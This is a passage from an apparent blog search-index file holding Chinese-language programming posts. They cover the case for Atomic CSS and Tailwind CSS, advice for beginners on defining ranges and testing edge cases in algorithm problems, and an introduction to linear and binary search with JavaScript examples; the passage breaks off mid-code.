CSS 規則跟 context 有關，在大型專案中維護就會變得困難。 舉例來說，如果有人手賤去改了 rightRail 這個 id，想說改成 blockRightRail 會更好，那你的樣式就壞了。你可能會質疑說：「不對啊，這是他的錯啊，他要改的話應該就要確認其他地方不會壞」，有改過的人都知道，要確認其他地方有沒有壞，是多麽困難的一件事情，更何況是在大型專案之中。很可能你改 A 的時候，根本不會預期 B 會壞掉，因為你根本不知道他們有關。 或如果別的 team 想把你這個 media object 拿去用，於是就連同 CSS 一起複製貼上到他們專案，可是卻發現他們的 id 並沒有 rigthRails，那就要去改動 style。 第四點的話也是只有在 Yahoo! 這種大型公司才比較會做到的事情（至少我是沒做過），就是在做 l10n 的時候會有很多細節要考慮，例如說有些國家的閱讀方向是左到右，有些是右到左。 上面的 case 如果要改變方向，就要加上這兩個規則： .rtl .media .img &#123; margin-right: auto; /* reset */ float: right; margin-left: 10px; &#125; .rtl .media .imgExt &#123; margin-left: auto; /* reset */ float: left; margin-right: 10px; &#125; 接著，作者就提出了 Atomic CSS 的概念，然後以 Atomic CSS 來改寫，並告訴你這樣改的好處在哪，HTML 跟 CSS 如下： &lt;div class=\"Bfc M-10\"> &lt;a href=\"https://twitter.com/thierrykoblentz\" class=\"Fl-start Mend-10\"> &lt;img src=\"thierry.jpg\" alt=\"me\" width=\"40\" /> &lt;/a> &lt;div class=\"Bfc Fz-s\"> @thierrykoblentz 14 minutes ago &lt;/div> &lt;/div> .Bfc &#123; overflow: hidden; zoom: 1; &#125; .M-10 &#123; margin: 10px; &#125; .Fl-start &#123; float: left; &#125; .Mend-10 &#123; margin-right: 10px; &#125; .Fz-s &#123; font-size: smaller; &#125; 針對第一點的問題，還記得一開始的新需求嗎？現在我們不需要新增一個 CSS 規則，只需要在 HTML 加上 class=&quot;Fl-sart Mend-10&quot;，就可以改變 UI 的樣式，但是沒有新增任何規則。 第二點，現在所有需要 overflow:hidden 跟 zoom:1 的元素，我都只要用一個 class name 叫做 .Bfc 就可以搞定了，無論有多少個元素要用，我都只有一個 CSS selector。 第三點，現在的 class name 已經跟 context 無關了，我上面講的問題完全不會發生。今天我樣式要變，我可以很安心地把 class name 刪掉，因為我知道其他地方絕對不會壞掉。這就是開頭第一段所講的「page agnostic」，沒有 context 的 class name 才能做到容易刪改，而且可以搬來搬去還能保證相同樣式。 換句話說，它解決的是 scope 的問題，就如同原文所說： I believe that this approach is a game-changer because it narrows the scope dramatically. We are styling not in the global scope (the style sheet), but at the module and block level. We can change the style of a module without worrying about breaking something else on the page. 最後關於剛剛第四點的方向問題，已經透過 class name 抽象化了，如果要改方向的話，只需要把 CSS 改成這樣即可： .Fl-start &#123; float: right; &#125; .Mend-10 &#123; margin-left: 10px; &#125; 透過改寫成 Atomic CSS，我們成功解掉了傳統 CSS 寫法上會碰到的幾個問題，而且具有以下優點： CSS 大小是線性成長的，重複的規則都會用到同一個 class name，因此檔案大小大幅降低 很容易可以支援 RTL 跟 LTR class name 變得與 context 無關，scope 也變小，因此更好維護也更好改動 其中我認為最重要的是第三點，這也是我支持 Atomic CSS 的原因。 在改樣式的時候，你可以直接把 class name 刪掉而不用怕影響到其他的元素，這是多麽美好的一件事情，你再也不用擔心改 A 壞 B，因為 class name 都跟 context 無關了。 Tailwind CSS 的作者以前有寫過一篇文章，對於 Atomic CSS 如何解決傳統 CSS 的問題有更多著墨跟範例，如果上面的理由無法說服你，可以看看這篇文章：CSS Utility Classes and “Separation of Concerns”。 總之呢，在原文中 TK 也預期到了僅管這個做法能解決問題，但讀者一定會有一堆疑惑，所以準備來一一擊破。 針對 Atomic CSS 的問題與反駁關於底下的問題跟反駁，除了文章以外，我可能還會引用到這三處的資料： ACSS FAQ HTML5DevConf: Renato Iwashima, “Atomic Cascading Style Sheets” Thierry Koblentz 在 FED London 2015 的簡報 1. 你的 class name 沒有語義，這樣不行啊，規格不是這樣寫的關於 semantic 的問題，在 2012 時也有一篇文章討論過這件事情：About HTML semantics and front-end architecture，在 HTML spec 裡面確實有這個段落： There are no additional restrictions on the tokens authors can use in the class attribute, but authors are encouraged to use values that describe the nature of the content, rather than values that describe the desired presentation of the content. 如果這個元素是個 image，那你的 class name 應該取叫 image，而不是取叫它的樣式例如說：display-block width-[150px] margin-3 之類的。 而上面引的那篇文章提到說其實在維護大型專案時，這樣的命名策略反而會變成一種阻礙，我們根本沒理由一定要照著這個做，因為： 跟 content 有關的語義你看 HTML 就看得出來了 除了一個叫做 Microformats 的標準以外，class name 對機器跟一般訪客來說沒什麼太大的意義 我們會用 class name，只是因為要跟 JS 或是 CSS 結合在一起。你想想，如果一個網站不需要 style 也不需要 JS，是不是就不會取 class name 了？那這樣你的網站有比較不 semantic 嗎？ 對開發者而言，class name 應該包含一些更有用的資訊 接著他舉了一個例子： &lt;div class=\"news\"> &lt;h2>News&lt;/h2> [news content] &lt;/div> 你看內容就知道這個區塊是來呈現 news 的，根本不需要 class name 也行。 這讓我想到當初 JSX 的發展，也是直接破壞掉了以往 JavaScript 跟 HTML 應該要分開的 best practice。 如果大家都執著於前人訂下的規範，當作信條一樣遵從，而不去反思這個信條存在的理由，就不會有這麼多革新的東西出現。 就如同 Challenging CSS Best Practices 一文中在最後提到的： Tools, not rules. We all need to be open to new learnings, new approaches, new best practices and we need to be able to share them. 2. 你的 class name 太難懂了，看不懂，可讀性很差直接截一張 FED London 2015 裡的簡報圖，他們說 ACSS 的語法參考自 Emmet，可讀性其實不會差： 不過這個解釋我不是很買單就是了，因為對於一個沒用過 Emmet 的人來說，看起來真的不太好懂，要花一段時間去熟悉那些縮寫。 3. 你這跟 inline style 有什麼不同？其實本質上是一樣的，都是把 style 限制在很小的 scope 裡面，但 Atomic CSS 解決了 inline style 的幾個壞處： CSS 的優先順序很高，很難蓋過去 很冗長 不支援 pseudo-class 或是 pseudo-element 底下截一張官網的圖： Atomic CSS 保留了 inline style 的好處，也就是 scope 很小，同時也解決了上面提到的那些壞處。 4. 你說可以降低 CSS 大小，但 HTML 大小不是也會上升嗎？那只是把成本轉到別的地方而已在原本 ACSS 的寫法下，其實 class name 的長度不會比本來大多少。 舉例來說，原本叫做 profile__image-background，改寫之後可能是 D-ib Bgc(#ff0010) 之類的。根據他們自己做的統計，Yahoo! 自己的網站平均的 class name 長度是 22，而其他沒有用 ACSS 寫法的 Twitter 平均是 28，USA today 是 38，衛報網站是 36，只有特別對 class name 做了 uglify 的 Facebook 是 18，些微勝出而已。 而且，除了 class name 並沒有明顯變長以外，ACSS 還有一個好處是重複字元很多，所以 gzip 的壓縮率會比較高。官網有給了一個數據是說他們自己經過測試後，semantic classes 可以降 35% 大小，而 ACSS 可以降 48%。 5. 那共用元件像是 button 該怎麼辦？難道我要每個地方都改樣式？在 Challenging CSS Best Practices 一文中有一個段落是在講這個： The technique I’m discussing here is not about banning “semantic” class names or rules that group many declarations. The idea is to reevaluate the benefits of the common approach, rather than adopting it as the de facto technique for styling Web pages. In other words, we are restricting the “component” approach to the few cases in which it makes the most sense. Atomic CSS 的出現並沒有要完全取代傳統 semantic 的做法，正確的做法應該是哪個適合就用哪個。 而官網 FAQ 也有特別提到類似的事情： If changing some styling requires you to edit multiple files, then you should use the classic CSS approach 舉例來說，你的程式裡面有個按鈕會一直重複出現，這時候如果每次都複製貼上 HTML，要改 class 的時候就要每個檔案都改，顯然是不合理。 在這種狀況下，用傳統的做法當然會是更好的。 我對 Atomic CSS 的看法前面看完了這麼多經典教材，來講一下我自己的想法。 首先，我認為 Atomic CSS 帶來了兩個獨特的好處： 降低 CSS 檔案大小 最大程度縮減 scope，讓維護變得容易 第一點是顯而易見的，這個應該就不用再多提了，CSS 檔案大小會小很多，這一點是其他 CSS 的解決方案沒辦法做到的。 第二點就如同我之前所講的，你改一個元素的 class name，保證只會改到這個元素本身，而不會動到其他地方，這是我認為 Atomic CSS 帶來的最大的好處，讓 style 變成 local scope。 有些人可能會疑惑說：「但你講的這個，CSS-in-JS 或是 CSS modules 也都做得到啊」，沒錯，這兩個解決方案也可以解決 scope 的問題。但 Atomic CSS 剛誕生的時候似乎這些解決方案都還不存在（或是還在非常早期），所以這裡比較的對象是傳統 CSS 的解決方案（像是 OOCSS、BEM、SMACSS 這些管理 CSS 的方法）。 除了優點以外，我也認為 Atomic CSS 有一些缺點以及不適合使用的地方： class name 很長，直接看 HTML 的話不好閱讀 如果沒辦法做到 component 化，那就不適合使用 Atomic CSS 需要花一段時間上手 Atomic CSS 的語法以及熟悉各種縮寫 三大框架的流行導致了現在的前端工程師普遍都會以 component 的思考方式去開發，而非傳統的 HTML 就管理內容、JavaScript 就管理程式、CSS 就管理樣式。以元件的方式去思考後，三者會合在一起，變成一個獨立封裝的元件。 而元件化之後，前兩項問題也就迎刃而解了。 第一點的話開發時我們都是去看 component 的檔案，不會直接去看到 HTML，而看到 component 時根據它的命名我們也會知道它在幹嘛，不需要 class name 做為輔助。 第二點的話因為都變成 component，所以可以保證要改動的時候只要改一個地方就好。 而第三點是我認為要導入 Atomic CSS 相關工具需要付出的成本，那就是熟悉新的語法跟各種縮寫，這個是避免不掉的。但是對我來說，這樣的成本不高，學習曲線也不高，頂多就是剛開始入門時要一直查表。比起它帶來的效益，成本其實已經很小了。 最後提一下 CSS-in-JS 跟 CSS modules 這兩個方案，一樣都解決了 scope 的問題，但跟 Atomic CSS 比起來有兩樣是做不到的。 第一點是 CSS-in-JS 跟 CSS modules 這兩個方案據我所知，應該都需要搭配一些前端的 library 或是框架來使用，例如說 React 或 Vue，但 Atomic CSS 不需要。舉例來說，假設今天一個專案它的 component 是在後端用 template engine 達成的，而非在前端，那就沒辦法用這兩套解決方案。 第二點是 CSS 大小，沒辦法跟 Atomic CSS 一樣這麼小。 不過關於這點，可以參考 Facebook 提出的 Atomic CSS-in-JS 方案，讓你寫起來像 CSS-in-JS，可以用傳統 CSS 語法，但實際上產生時卻幫你用 Atomic CSS 的方式來產生，巧妙地融合了兩者的優點，是滿值得關注的一項技術。 Tailwind CSS 改良了哪些部分？上面談到了這麼多 Atomic CSS 的東西，最後我們簡單來看一下 Tailwind CSS，比起一開始 Yahoo! 創造的 Atomizer，它有哪些優勢？ 其實在功能面上我覺得沒有相差太多，最大的優勢是我認為它的 DX（Developer Experience）更為突出，例如說它使用了更好看懂的 class name，文件也更加完整，很快就可以查到什麼語法應該怎樣寫： 不過事實上，我認為這些基於 Atomic CSS 的框架最佳化的方向都是類似的，都是針對 DX 的方向去做改善。 例如說 Windi CSS 就帶來很多語法上的改善以及新的用法，而 UnoCSS 以及 master CSS 也都有各自不同的做法，來增加開發者的體驗或是加快編譯的效率。 至於這些最佳化的細節我就不熟了，詳情可以參考重新构想原子化 CSS 這篇文章。 我對 Tailwind CSS 也沒有到很熟，這邊補充一個需要注意的地方，那就是 Tailwind CSS 是去掃你的 source code 字串有哪些符合特定格式，所以如果你的 class name 是用動態產生的，就會抓不到，像這樣： // 這樣寫抓不到 &lt;div class=\"text-&#123;&#123; error ? 'red' : 'green' &#125;&#125;-600\">&lt;/div> // 這樣寫才抓得到 &lt;div class=\"&#123;&#123; error ? 'text-red-600' : 'text-green-600' &#125;&#125;\">&lt;/div> 不確定其他的 library 有沒有把這問題解掉，但我自己是覺得沒有太大的關係，因為這種動態產生的方式能避免就盡量避免會比較好。 為什麼我會這樣說呢？ 分享一個小故事，以前我在維護一個用 Redux 的專案時有一系列操作長很像，例如說 post、user 跟 restaurant 的 CRUD 之類的，程式碼有很大一部分都重複，因此我就寫了一個 utils 來處理共同邏輯，只要寫 generateActions(&#39;user&#39;)，就自動幫你動態產生出 readUser 與 createUser 之類的 actions。 那時我想說這樣很讚，但同事提醒我說如果你這樣做，那全域搜尋 readUser 的時候就搜不到東西，因為那是程式動態產生的，在原始碼裡面找不到。 雖然我那時不覺得有什麼，但過了兩個月後我知道我錯了。當你面對一個不熟悉的專案時，要去修一個 bug，最常做的就是拿你手上的資訊去搜尋原始碼，看看出現在哪邊。如果你搜不到東西，那是滿挫折的一件事情，會需要花更多時間去找問題到底在哪個範圍。因此，可以被搜尋到是很重要的。 或是再舉一個例子，假設今天設計師突然改變心意，說所有之前用 text-red-600 的地方應該要改成 text-red-500，但新的地方還是會用到 text-red-600，所以我們不能直接改設定檔的色碼，一定要去改 source code，把 text-red-600 都換成 text-red-500。此時你會怎麼做？全域搜尋然後取代，搞定。 此時，像上面那種動態產生 class name 的 case 除非你特別記得，否則就不會被改到。因為搜尋不到，所以你也不知道那邊其實會出現 text-red-600。如果真的要用動態產生，那至少加個註解標注一下會用到的東西的全名，讓它能被搜尋到。 結語「每樣工具都有它適合的地方」這句話大家都知道，但重點是「那它到底適合什麼地方？不適合什麼地方？它解決了什麼問題？又額外創造了哪些問題？」，基於這些問題去討論一項技術，才能更深入地去了解它。 Atomic CSS 是在維護大型專案的時空背景之下誕生的，如果你沒有碰到那種「牽一髮而動全身，改一個地方要檢查好多地方會不會壞掉」的狀況，那你用了 Atomic CSS，可能確實感覺不到它的好處，因為它想解決的問題你根本沒有碰到。 對於那些「它想解決的問題，你的專案沒碰到」的狀況下，導不導入的差異本來就不大，有些甚至還會增加不必要的複雜度。 若是在一個「相同的元件卻四處分散，當你改 HTML 時需要同時改很多地方」的專案用上了 Atomic CSS，那確實是不適合，官方文件也不推薦這樣做。如果硬要用，那碰到維護性的問題時並不是 Atomic CSS 的錯，而是當時選擇技術的人的錯（就跟你說不適合了還要用）。 又或是你寫了一個 UI library，而這個 library 又需要支援一些 UI 的客製化，如果你用 Atomic CSS 來做樣式，那你要怎麼完成這件事？難道要把每一個 HTML 元素都開放傳 class name 進去嗎？在這個狀況下，像是 antd 那樣使用傳統的 CSS 解決方案說不定比較適合，因為可以直接改原本的 Less 檔案，就能輕鬆客製化。 （daisyUI 是靠著把 HTML 一起開放出來，藉此達成客製化，我上面指的案例比較像是寫一個 React component，把實作細節包在裡面的那種） 每個專案都有不同適合的技術與工具，在做選擇時應該先了解每個專案的需求，以及每一項技術的優缺點，才能挑到相對合適的技術。 最後，從 Atomic CSS 的歷史中，我覺得最值得學習的其實是「Tools, not rules」那一段。以前的最佳實踐不一定適用於現在的狀況，以前的 class name 不是這樣用的，不代表現在就不行。我們不該墨守成規，不該執著在那些規則上面；如果別的做法有顯而易見的好處，那為何不呢？ 參考資料： Challenging CSS Best Practices Let’s Define Exactly What Atomic CSS is The Making of Atomic CSS: An Interview With Thierry Koblentz Atomizer ACSS FAQ HTML5DevConf: Renato Iwashima, “Atomic Cascading Style Sheets” Thierry Koblentz 在 FED London 2015 的簡報 About HTML semantics and front-end architecture Atomic CSS-in-JS 淺談 CSS 方法論與 Atomic CSS 邪魔歪道還是苦口良藥？Functional CSS 經驗分享 客觀評價 TailwindCSS Uno CSS - 一統天下的明日之星？ 重新构想原子化 CSS 在 VUE SFC (vue-cli) 規劃 Tailwind CSS 架構","link":"/2022/05/23/atomic-css-and-tailwind-css/"},{"title":"程式解題新手入門注意事項","text":"前言在這兩三年之間，「刷題」似乎成為了一種風潮。本科系要去面試大公司的時候要刷題，非本科系出去面試也要刷題，好像只要沒有刷題就會落後他人，就會被公司刷掉。 其實我一直不是很喜歡「刷題」這個詞，主要是因為「刷」這個字。不知道大家對這個字的解讀是什麼，但我會認為有種「為了寫題目而寫題目」的感覺，就好像題海戰術那樣。雖然說題海戰術用得好的話成效滿顯著的，但總感覺很多人刷到最後會變成「看過的題目就會，沒看過的就一定不會」，如果是這樣子的話，那我覺得不是一件好事。 之前我有寫了一篇文章：當我們在學程式時，要學的到底是什麼？，稍微談了一下這件事情。 總之呢，比起刷題這個詞，我更喜歡用「程式解題」四個字來表達我想表達的意思。 有很多人剛開始練習程式解題的時候，是從演算法與資料結構開始的。可能去找了一些書或是線上課程來看，接著從經典的開始，例如說泡沫排序、選擇排序、插入排序，再來是困難一些的合併排序以及快速排序等等。但我覺得對真正的初學者來說，學這些還太早了。 簡單來說就是：「如果你寫不出九九乘法表，你會寫 KMP（可代換成任何演算法）也沒什麼用。」如果有兩個人，A 會寫九九乘法表但寫不出 KMP，B 會寫 KMP 但寫不出九九乘法表，我一定把 B 淘汰掉。因為 B 很有可能是直接把 KMP 的寫法記起來，而不是真的理解，否則我不相信他寫不出來九九乘法表。 在這邊也誠摯呼籲各個公司在面試的時候可以考那種比較簡單的題目，有時候成效會出乎意料的好。例如說找中位數、判斷質數或是大數加法之類的，會發現有些人還真的寫不出來。 總之呢，我認為要透過程式解題來熟悉演算法是絕對沒問題的，也是很棒的一個方法，但基礎要打穩，沒有打穩的話就只是在背題目而已。 而且還有一點很重要，在真正開始解題以前，你要先理解題目並且確切掌握題目的範圍。這點很多人都會忽略，直接就動手開始解題了，這在寫白板題的時候也不是一件好事。 所以這篇我們不談解題本身，而是來談談在動手解題以前應該先做的事。底下我們先來看一個題目，來源是 NPSC 2007 年國中組初賽。 題目名稱：不公平的人，是誰？自從周杰倫出了新專輯「牛仔很忙」後，大郭和小郭就時常幻想自己是牛仔，終於有一天，大郭找來了兩把水槍要和小郭決鬥。 可是玩了幾場以後，小郭全身都溼透了，大郭卻是一身乾爽，隱忍許久的小郭終於發難了！ 小郭：「我都噴不到你………」 大郭：「那大概是你技術差吧？」 小郭：「騙人～騙人～你一定有作弊吧？」 雖然小郭什麼都比大郭差（諸如智力、運動神經等…），但是如果在事前大郭準備給小郭的水槍比較差的話，那代表大郭是從一開始就有心把這場遊戲策畫成不公平的壞人。 剛好路過的你，被吵吵鬧鬧的兩人抓去當裁判。 輸入說明輸入會是兩個字串 M 與 N。其中M代表大郭的水槍射程，N代表小郭的水槍射程，注意為求精確，所有射程的長度單位均為奈米。因為大郭弄來的水槍是22世紀的產物，故水槍的射程非常非常遠，最長可以到達400位數的數字（射程必為一非負整數）。 輸出說明對每一組測試資料，你應該回傳一個字串，該列從小郭的角度出發（小郭雖然比較笨，但還是很奸詐的！），判斷這是不是一場公平的比賽（對於小郭來說，只要大郭的射程不比小郭大，就是一場公平的遊戲）。若是對小郭有利的遊戲，則回傳「Fair」，若不是，則回傳「Unfair」 範例輸入123 456 範例輸出Fair 以上就是一個完整的題目，會包含題目介紹、輸入說明、輸出說明以及範例。你可能會覺得就是一個數字比大小的問題而已，但其實沒有那麼簡單。 接著我們就來看看應該要注意哪些東西。 1. 題目的範圍為什麼這種程式解題的題目一定要給範圍？要回答這個問題很簡單，我們先來看看如果不給範圍會怎樣，例如說： 請寫出一個判斷質數的 function 你可能看到以後就批哩啪啦寫完然後就交卷了。可是因為這個題目非常不明確，所以你其實沒有辦法確認自己的答案是不是對的，例如說： 是回傳 true 或 false 嗎？還是回傳字串 YES 跟 NO？ 如果輸入是字串怎麼辦？我需要做處理嗎？ 如果是小數或負數呢？需要做特別處理嗎？ 如果數字超過 integer 的範圍會發生什麼事？ 若是沒有明確地定義輸入以及輸出，其實你根本寫不出「正確」的程式，因為也沒有「正確」這種事，所以定義輸入範圍的第一個目的就是幫你更明確地去釐清題目。 例如說一個比較好的題目會長這樣： 請寫出一個函式，給定一個正整數 n（1&lt;&#x3D;n&lt;&#x3D;100000），請回傳 n 是否為質數，是的話回傳 true，反之回傳 false 當題目說「給定一個正整數 n（1&lt;&#x3D;n&lt;&#x3D;100000）」的時候，代表你可以完全不管超出這範圍的情形。n 絕對不會是字串，也不會是陣列，也不會是 0，不會是小數或負數，所以不需要去理會這些 case。 順帶一提，這是很多人在面試白板題的時候會犯的錯誤，沒有把題目範圍問清楚就開始實作了。 白板題是可以跟面試官討論的，這時候你就應該把題目範圍問清楚，才開始動手解題，而且題目範圍其實也會影響到你的解法。 舉開頭的題目來說： 因為大郭弄來的水槍是22世紀的產物，故水槍的射程非常非常遠，最長可以到達400位數的數字（射程必為一非負整數） 以 JavaScript 為例，有些人會很天真的以為這一題是在考你兩個「數字」比大小。400 位數的數字，JavaScript 存得下嗎？存不下。 可以用Number.MAX_SAFE_INTEGER來取到 Number 型態能存的最大數字，連 20 位都不到，何況是 400 位。 如果題目跟你說數字是 10 位數以內，就可以直接把字串轉成數字比大小然後回傳結果。但今天數字是 400 位數，就沒辦法用 Number 這個型態。所以要嘛就是直接拿字串來比大小，要嘛就是用比較潮的 BigInt 來解。 若是題目沒有給範圍，就沒辦法決定要採取怎樣的做法。所以範圍的目的就是把題目定義地更明確，畫一條線在那邊，跟你說：「欸欸，題目範圍到這邊喔，超出界線的可以不用考慮」 2. 寫完之後的測試如果是一些 Online Judge（以下簡稱 OJ）系統，平時的解題可以一直試錯，隨意寫完之後就丟上去，有錯的話再來 debug 找錯誤，沒錯的話就解下一題。 但是比賽或是有些面試的話就不一樣了，你只有一次機會，或是答錯了會有 penalty 之類的，所以要在送出答案之前自己先檢查個幾遍，確認沒什麼問題才送出。 這時候測試就很重要，基本上有幾個方法可以測試你寫出來的程式是否正確，例如說第一個，也是最簡單的一個：先拿題目給的範例測資（測試資料的簡稱）測，如果範例過不了那一定是寫錯了。 第二，如果可以的話，寫一個程式來測。這有些題目做得到有些做不到，例如說判斷質數可能就做不到，除非你去找別人寫好的判斷質數的 code 來用。但如果是上面數字比大小的這一題，針對小範圍（數字位數低於 10 位數以下）的情形就可以寫程式來測： // 絕對是對的的數字比較 function compare(a, b) &#123; return b >= a ? 'Fair' : 'Unfair' &#125; // 跑一萬遍 for(let i = 1; i &lt;=10000; i++) &#123; // 隨機產生資料 const a = Math.floor(Math.random() * 1e9) const b = Math.floor(Math.random() * 1e9) // 判斷一般數字比大小以及字串比大小的結果 // 記得這邊要轉成字串來比對 if (compare(a, b)!== stringCompare(a + '', b + '')) &#123; // 出錯，印出來哪筆資料錯誤 console.log('error', a, b) &#125; &#125; 跑個十次你就測十萬筆資料了，就能保證一些正確性。除了這樣以外，還有一點很重要：自己生測資，而且要產生那種邊界條件的測資。 3. 邊界條件邊界條件通常也被稱為 boundary case、corner case、edge case 等等（最精確的定義好像不太相同，但概念上應該差不多），一言以蔽之，就是很容易讓你程式出問題的測資，要測你的程式在極端的情形之下會不會壞掉。 以上面比大小的題目為例，可能就是 0 0、0 10 這種比較少會考慮到的條件。或者是以大數加法（兩個字串當作數字相加，例如說&#39;123&#39;+&#39;123&#39; =&gt; &#39;456&#39;）為例，就會是： 0 + 0，兩個零相加 0 + 9999，加完沒有改變 1 + 9999，加完會進位 最後再舉一個判斷迴文的例子，可能就會是： 空字串 只有一個字的字串 這些 edge case 是很容易會欠缺考慮而出錯的地方，所以在產生測資的時候，最好是自己也要想一下有哪些 edge case 是沒有考慮到的。很多時候你沒有拿滿分，就是因為這些 edge case 沒有考慮到。 可是就算滿分，就代表真的對了嗎？ 4. 假解的可能性一般來說我們稱那些通過 OJ 但其實不是正確的解答為「假解」，通常會發生都是因為 OJ 上的測資太弱，所以才讓假解蒙混過關。 像是上面比大小這題，雖然題目寫說 M 與 N 最多可以到 400 位數，但有可能測資偷懶，最大只到五位數而已。在這種情形底下，你寫一個把字串轉換為數字然後比大小的解法就可以過關，但我們不會說這是正解，因為多加一筆測資答案就錯了。 或者是有些題目沒有卡時間複雜度，原本預期要 O(n) 的解法，結果用 O(n^2) 也可以過。有些假解寫了你會自己知道是假解，但有些你不會發覺。這部分其實要靠 OJ 來把關，測資必須用心產生，才能避免這種假解的狀況。 結論寫這篇的原因是希望剛接觸程式解題的新手們可以理解在動手解題之前，其實有更多重要的事需要去關注。記得先把題目定義清楚，才去動手解題，這個在面試考白板題的時候也是必備技能之一。 如果寫題目的時候發現題目沒有定義清楚，那這個題目或許就不是這麼好，可以跟網站反映一下，讓他們補上題目範圍。 祝大家都能在程式解題的路上找到樂趣。","link":"/2019/11/01/before-start-leetcode/"},{"title":"淺談二分搜尋法","text":"前言在寫程式的時候，其實會滿常用到「搜尋」的功能，最簡單的搜尋就是在一串數字裡面找出你想要的數字，而這也是我們今天的主題。 這一篇大致上會分成三個部分，第一部分會先介紹線性搜尋法，第二部分介紹二分搜尋法，最後一部分談談二分搜尋法在不同條件底下的實作方式會有什麼不同。 線性搜尋法為了由淺入深，我們從最基礎的線性搜尋法（Linear search）開始談起。 就如同它的名字一樣，線性搜尋法就是「從頭到尾一個一個找」，時間複雜度為 O(n)，很容易理解也很好實作 function linear_search(array, target)&#123; for(var i=0; i&lt;array.length; i++)&#123; if(array[i]==target) return i; &#125; return -1; //找不到 &#125; 或是可以參考這個簡單的動畫，錄自Algorithm Visualizations 二分搜尋法假如今天要搜尋的數列是有序的，我們便可以把線性搜尋法再做優化，使時間複雜度再更低一點 二分搜尋法的原理跟小時候大家玩「終極密碼」的流程十分類似，就是那個 1~99 要你猜數字的遊戲為了快一點猜到（或是讓敵人快一點猜到），有些人第一個數字會喊 50，為什麼呢？因為無論數字是小於 50 或是大於 50，剩下能猜的數字一定會砍一半，變成原本的 1&#x2F;2假設下一次也繼續這樣砍對半，大概猜個七八次，就能「保證」一定猜得到 這邊可以做個簡單的小驗證：如果只有 1 個數字，猜 1 次必定猜得到如果只有 2 個數字，猜 2 次必定猜得到如果只有 3 個數字，猜 2 次必定猜得到如果只有 4 個數字，假設是 1 2 3 4 好了，切半猜 2，結果範圍變成 3 4，剩兩個數字，要猜 2 次所以 4 個數字的話，猜 3 次一定猜得到 如果有 8 個數字，切半剩下 4 個，所以要猜 1 + 3 &#x3D; 4 次…這樣繼續推廣下去，就會發現保證能猜到的次數與以 2 為底取 log 有關詳細數學公式就不再贅述 所以呢，二分搜尋法的流程也非常簡單： 決定好左邊界 L，右邊界 R 取 (L+R)&#x2F;2，作為這中間的數 M 如果 array[M] &#x3D;&#x3D; 要找的數，return 如果 array[M]&gt;要找的數，表示 M~R 這一段數字都是不可能的（因為都比array[M]還要大），所以讓 R &#x3D; M - 1 如果 array[M]&lt;要找的數，表示 L~M 這一段數字都是不可能的，所以讓 L &#x3D; M + 1 如果 R&gt;&#x3D;L，持續第 2 步，否則回傳 -1（代表找不到） 所以 L 跟 R 就會變得愈來愈靠近要找的數字，而且每一步都可以刪減掉一半的可能性這邊的停止條件是「當L&gt;R」的時候，就代表找不到了因為 L 代表的意義是：最左邊的有可能的值，換句話說，假如有答案的話，一定在 &gt;&#x3D;L 的位置R 代表的是：最右邊有可能的值，假如有答案，一定在 &lt;&#x3D;R 的位置所以當L &gt; R 的時候，&gt;&#x3D;L 跟 &lt;&#x3D;R 已經是空集合了，代表不可能有答案 這邊還有一個要特別注意的點是(L+R)/2這邊，當值很大的時候可能會造成 overflow為了避免這種情形，可以改寫成(R-L)/2 + L 可以參考一樣從 Algorithm Visualizations 錄製的簡單動畫 （藍色是 L，黃色是 R，綠色是 M，要找的數字是 180） function binary_search(array, target) &#123; var L = 0, R = array.length - 1; while(L&lt;=R) &#123; var M = Math.floor((L+R)/2); if(array[M]==target)&#123; return M; &#125; else if(array[M]>target) &#123; R = M - 1; &#125; else &#123; L = M + 1; &#125; &#125; return -1; &#125; 不同條件的二分搜尋法剛剛所介紹的二分搜尋法，就只是要求在一連串數列裡面回答說有沒有找到，有的話在第幾個位置有如果數列裡面有重複的數字，而且條件稍微變更一下成：回傳「第一個」出現的位置例如說 1 2 2 2 2 2 3 3 要找 2，就回傳：1，因為第一個 2 出現在 index 為 1 的地方 或者，改成回傳「最後一個」出現的位置同樣以上面那個例子來說，要回傳：5，因為 index 5 是最後一個 2 甚至還有稍微更複雜一點的，例如說以下四種： 回傳第一個 &gt;&#x3D;target 的位置 回傳第一個 &gt;target 的位置 回傳最後一個 &lt;&#x3D;target 的位置 回傳最後一個 &lt;target 的位置 （可參考：lower_bound）再搭配上剛剛所說的找等於 target 的第一個與最後一個的位置可以知道這樣的變形總共有 6 種，那該怎麼辦呢？ 其實原理都很類似，一樣是用二分搜尋去排除最多的數字，但是在一些條件判斷上會有些微差異如果弄得不好的話，很容易會造成無窮迴圈，例如說找最後一個小於target 的數： function search(array, target)&#123; var L = 0, R = array.length - 1; while(L&lt;=R) &#123; var M = Math.floor((L+R)/2); if(array[M]&lt;target)&#123; L = M; &#125; else &#123; R = M - 1; &#125; &#125; return M; &#125; 我們拿這一組範例去跑：search([1,2,3,4,5],2)剛開始 L&#x3D;0, R&#x3D;4, M&#x3D;2array[2] &#x3D; 3 &gt; 2，所以 R &#x3D; 2-1 &#x3D; 1 接著 L&#x3D;0, R &#x3D; 1, M &#x3D; 0array[0] &#x3D; 1 &lt; target，L &#x3D; M &#x3D; 0 然後就會再重複一樣的步驟，陷入無窮迴圈這個就是寫二分搜的時候最常碰到的情況之一一些條件沒有設定好，或許只是差一個等號或者是+1 -1，但就是搞不定 網路上可以找到許多文章，都是在講解應該要怎麼設定這些條件： 二分查找法的实现和应用汇总 漫谈二分查找-Binary Search 二分搜索法简单分析与总结 或是這篇知乎上的問答也有很多討論可以參考：二分查找有几种写法？它们的区别是什么？其中我最喜歡的是這個回答： 说到面试，其实这题的难点在于最后边界条件，那么我们根本不用判断那个边界，二分到区间小到一定程度，比如5个元素以下，就顺序查找好了，反正也是O(lgN)的，而且最后5个元素顺序查找平均也只需要比较两三次而已，跟你二分差不多，我本人也很推荐在实际工程中这样写，可以规避很多麻烦的bug，用最稳妥的办法解决问题 這個思路我之前也有想過，既然+-1或者要不要加等號這麼麻煩，那乾脆就不要加了吧！只要把終止條件改一下，判斷邏輯也改一下就好一樣舉上面那個：找最後一個小於target 的數為例子 基本上的原則就是： 保證答案一定在閉區間 [L, R] 裡面 當這區間剩下的數很少時，改用線性搜尋 這樣就不用怕碰到無窮迴圈的問題了，下面附上程式碼： // 傳回最後一個 &lt; target 的數 function lower_bound(array, target) &#123; // 先看看是否沒答案 // 如果第一個數還是沒有 &lt; target，代表沒答案 if(array[0]>=target) return -1; // 結束條件是區間內剩兩個數字的時候 var L = 0, R = array.length-1; while((R-L+1)>2) &#123; var M = Math.floor((L+R)/2); if(array[M]&lt;target)&#123; L = M; &#125; else &#123; R = M - 